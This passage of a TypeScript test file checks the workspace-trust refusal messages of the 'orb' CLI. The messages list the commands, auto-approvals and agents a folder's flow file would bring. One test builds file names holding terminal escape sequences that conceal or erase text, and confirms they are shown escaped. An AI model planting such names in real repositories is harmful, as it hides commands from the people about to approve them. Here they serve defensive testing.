  expect(refused).toContain(reason)
  expect(refused).toContain("Starting `orb` there asks the same question.")
  // Not the reasons of the other doors.
  expect(refused).not.toContain("sends the folder's instructions to a model")
  expect(refused).not.toContain("run store")

  const old = unanswered(repo)
  expect(old).toContain(`the server is older than workspace trust, so it cannot say whether ${repo} is trusted`)
  expect(old).toContain(reason)
  expect(old).toContain("`orb service restart`")
})

test("the text for a server that cannot say whether the folder is trusted names what the command brings and every way to get an answer", () => {
  const module = path.join(repo, "workflows", "plan.ts")
  const file = path.join(repo, "flows", "feature.yaml")

  const imports = unanswered(repo, module)

  expect(imports).toContain(`the server is older than workspace trust, so it cannot say whether ${repo} is trusted`)
  // The file is named from the folder, and what the command does with it is said as it is for a folder that is not trusted.
  expect(imports).toContain(`this command runs code from the folder: it imports ${path.join("workflows", "plan.ts")},`)
  // A restart gives the server the routes, and the two flags start a current private server in its place.
  expect(imports).toContain("`orb service restart`")
  expect(imports).toContain("--standalone starts one that checks the folder")
  expect(imports).toContain("--trust starts one that trusts the folder for this run only")
  // The folder is not known to be untrusted, and an older server cannot trust it either.
  expect(imports).not.toContain("is not trusted")
  expect(imports).not.toContain("`orb trust`")

  const defined = unanswered(repo, undefined, {
    file,
    commands: [{ id: "tests", command: "npm test" }],
    approvals: [{ id: "api", permissions: "auto" }],
    agents: [{ id: "api/judge", agent: "autopilot" }],
    models: [],
  })
  expect(defined).toContain(`the server is older than workspace trust, so it cannot say whether ${repo} is trusted`)
  expect(defined).toContain("this command runs shell commands from the folder")
  expect(defined).toContain(`${path.join("flows", "feature.yaml")} defines them`)
  expect(defined).toMatch(/^ {2}tests {2}npm test$/m)
  expect(defined).toContain("It also approves actions without asking you")
  expect(defined).toMatch(/^ {2}api {2}permissions: auto$/m)
  expect(defined).toContain("It also lets the file choose which of your agents run its nodes")
  expect(defined).toMatch(/^ {2}api\/judge {2}agent: autopilot$/m)
  expect(defined).toContain("`orb service restart`")
  expect(defined).not.toContain("is not trusted")

  // A file that only names an agent is enough for such a server to refuse, as it is for a folder known not to be trusted.
  const named = unanswered(repo, undefined, {
    file,
    commands: [],
    approvals: [],
    agents: [{ id: "api", agent: "autopilot" }],
    models: [],
  })
  expect(named).toContain("this command lets the file choose which of your agents run its nodes")
  expect(named).toMatch(/^ {2}api {2}agent: autopilot$/m)
  expect(named).not.toContain("shell commands")
  expect(named).not.toContain("approves actions")
})

test("the refusal shows the name of a file it names on one line, as a clone can give its files any name the platform allows", () => {
  // SGR 8 conceals what is printed after it, so a name that holds it would hide the commands listed below it.
  const hidden = path.join(repo, "flows", "a\u001b[8m.yaml")
  const status = {
    directory: repo,
    trusted: false,
    persistent: true,
    withheld: [{ path: path.join(repo, ".orbit", "b\u001b[2Kc.md"), kinds: ["commands"] }],
  } satisfies TrustStatus
  const commands = [{ id: "tests", command: "npm test" }]
  const approvals = [{ id: "api", permissions: "auto" }]
  const agents = [{ id: "api", agent: "autopilot" }]
  const shown = `${path.join("flows", "a")}\\x1b[8m.yaml`

  for (const text of [
    refusal(status, hidden),
    refusal(status, undefined, { file: hidden, commands, approvals: [], agents: [], models: [] }),
    refusal(status, undefined, { file: hidden, commands: [], approvals, agents: [], models: [] }),
    refusal(status, undefined, { file: hidden, commands: [], approvals: [], agents, models: [] }),
    unanswered(repo, hidden),
    unanswered(repo, undefined, { file: hidden, commands, approvals, agents, models: [] }),
  ]) {
    // No line has a control or format character in it, apart from the end of the line that the text itself is made of.
    for (const line of text.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
    expect(text).toContain(shown)
  }
  // The files that are held back come from the same folder, and are shown the same way.
  const held = refusal(status)
  for (const line of held.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
  expect(held).toContain(`${path.join(".orbit", "b")}\\x1b[2Kc.md`)
})
